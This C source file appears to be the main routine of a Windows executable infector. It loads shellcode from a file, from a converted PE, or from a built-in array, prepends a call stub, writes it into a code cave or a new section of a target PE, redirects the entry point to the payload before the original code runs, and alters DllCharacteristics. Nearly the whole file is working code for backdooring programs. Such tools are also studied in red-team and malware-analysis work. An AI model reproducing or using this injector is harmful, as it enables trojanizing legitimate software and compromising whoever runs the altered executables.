#define _CRT_SECURE_NO_WARNINGS
#include "pe.h"
#include "pe2sh.h"
#include <Windows.h>
#include <stdio.h>
#define MAX_ARG_LEN 128

extern unsigned char sc[];

int main(int ac, const char **av) {
	char filename[MAX_ARG_LEN] = {0};
	char outputName[MAX_ARG_LEN] = {0};
	char shellcodeFilename[MAX_ARG_LEN] = {0};
	char pe2shellcodeFilename[MAX_ARG_LEN] = {0};
	char pe2shellcodeOutput[MAX_ARG_LEN] = {0};
	int useCave = 0;
	if (ac < 2) {
		printf("usage: %s filename [-o output] [-s shellcode] [-p pe2shellcode] [-v pe2shellcode_output] [-c]\n", av[0]);
		printf("\t do not use -s and -p -v at the same time\n");
		exit(0);
	}
	// default args
	strncpy(filename, av[1], MAX_ARG_LEN);
	strncpy(outputName, filename, MAX_ARG_LEN);		// same name as input
	// parse command arguments
	for (int i = 2; i < ac; i++) {
		if (!strcmp("-o", av[i]) && i + 1 < ac) {
			strncpy(outputName, av[i + 1], MAX_ARG_LEN);
		}
		else if (!strcmp("-s", av[i]) && i + 1 < ac) {
			strncpy(shellcodeFilename, av[i + 1], MAX_ARG_LEN);
		}
		else if (!strcmp("-p", av[i]) && i + 1 < ac) {
			strncpy(pe2shellcodeFilename, av[i + 1], MAX_ARG_LEN);
		}
		else if (!strcmp("-v", av[i]) && i + 1 < ac) {
			strncpy(pe2shellcodeOutput, av[i + 1], MAX_ARG_LEN);
		}
		else if (!strcmp("-c", av[i])) {
			useCave = 1;
		}
	}
	// post processing arguments
	if (pe2shellcodeFilename[0] != 0 && pe2shellcodeOutput[0] == 0) {
		sprintf_s(pe2shellcodeOutput, MAX_ARG_LEN, "%s_sh.exe", pe2shellcodeFilename);
	}
	
	FILE* file = fopen(filename, "rb");
	if (file == NULL) {
		fprintf(stderr, "%s: No such file or directory\n", filename);
		exit(EXIT_FAILURE);
	}

	// parse PE file
	printf("parsing PE file...\n");
	PE_file pefile;
	PEParse(&pefile, file);
	fclose(file);

	// loading shellcode
	printf("loading shellcode...\n");
	char* shellcode;
	size_t shellcodeSize;
	if (pe2shellcodeFilename[0] != 0) {
		printf("pe2shellcode...\n");
		PE_file shellPE;
		FILE* file_shell = fopen(pe2shellcodeFilename, "rb");
		if (file_shell == NULL) {
			fprintf(stderr, "%s: No such file or directory\n", pe2shellcodeFilename);
			exit(EXIT_FAILURE);
		}
		PEParse(&shellPE, file_shell);
		fclose(file_shell);
		shellcodeSize = pe2sh(&shellPE, &shellcode, pe2shellcodeOutput);
	}
	else if (shellcodeFilename[0] != 0) {
		printf("read shellcode from %s\n", shellcodeFilename);
		FILE* file = fopen(shellcodeFilename, "rb");
		if (file == NULL) {
			fprintf(stderr, "%s: No such file or directory\n", shellcodeFilename);
			exit(EXIT_FAILURE);
		}
		fseek(file, 0, SEEK_END);
		shellcodeSize = ftell(file);
		fseek(file, 0, SEEK_SET);
		shellcode = (char*)malloc(shellcodeSize * sizeof(char));
		fread(shellcode, 1, shellcodeSize, file);
		fclose(file);
	}
	else {
		printf("using default shellcode\n");
		shellcode = sc;
		shellcodeSize = 205;
	}

	// build payload
	printf("building payload...\n");
	BYTE prefix[] = {
		0xe8, 0x06, 0x00, 0x00, 0x00,	// call shellcode
		0xe8, 0x00, 0x00, 0x00, 0x00,	// call Entry Point
		0xc3							// ret
	};
	BYTE* payload = (BYTE*)malloc(sizeof prefix + shellcodeSize);
	if (payload == NULL) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	memcpy(payload, prefix, sizeof prefix);
	memcpy(payload + sizeof prefix, shellcode, shellcodeSize);
	DWORD oldEntryPoint = pefile.pimageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	DWORD newEntryPoint;
	DWORD offset;

	if (useCave) {
		int index;
		size_t caveSize = findLargestCave(&pefile, &index);
		if (caveSize >= shellcodeSize + sizeof(prefix)) {
			newEntryPoint = pefile.ppimageSectionHeader[index]->VirtualAddress + pefile.ppimageSectionHeader[index]->Misc.VirtualSize;
			offset = oldEntryPoint - newEntryPoint - 10;
			memcpy(payload + 6, &offset, sizeof(DWORD));
			printf("filling code cave...\n");
			PEwrite(&pefile, pefile.ppimageSectionHeader[index]->PointerToRawData + pefile.ppimageSectionHeader[index]->Misc.VirtualSize,
				payload, sizeof prefix + shellcodeSize);
			printf("insert to %s, VirtualSize: %08x, payload size: %08x\n", pefile.ppimageSectionHeader[index]->Name,
				pefile.ppimageSectionHeader[index]->Misc.VirtualSize, sizeof prefix + shellcodeSize);
			pefile.ppimageSectionHeader[index]->Misc.VirtualSize += (sizeof prefix + shellcodeSize);
			printf("VirtualSize: %08x\n", pefile.ppimageSectionHeader[index]->Misc.VirtualSize);
		}
		else {
			printf("cave is so small...");
			useCave = 0;
		}
	}
	if (!useCave) {
		newEntryPoint =
			pefile.ppimageSectionHeader[pefile.pimageNTHeaders->FileHeader.NumberOfSections - 1]->VirtualAddress +
			align(pefile.ppimageSectionHeader[pefile.pimageNTHeaders->FileHeader.NumberOfSections - 1]->Misc.VirtualSize,
				pefile.pimageNTHeaders->OptionalHeader.SectionAlignment);
		offset = oldEntryPoint - newEntryPoint - 10;
		memcpy(payload + 6, &offset, sizeof(DWORD));
		// insert shellcode to a new section
		printf("insert new section...\n");
		insertNewCodeSection(&pefile, payload, sizeof prefix + shellcodeSize);
	}
	printf("old Entry: %08x, new Entry: %08x, offset: %08x\n", oldEntryPoint, newEntryPoint, offset);
	// change Entry Point to newly inserted section
	pefile.pimageNTHeaders->OptionalHeader.AddressOfEntryPoint = newEntryPoint;
	printf("change Adress of Entry Point to %x\n", newEntryPoint);

	pefile.pimageNTHeaders->OptionalHeader.DllCharacteristics = 0x8100;

	// save PE file
	PESave(&pefile, outputName);

	// free PE file
	PEFree(&pefile);
}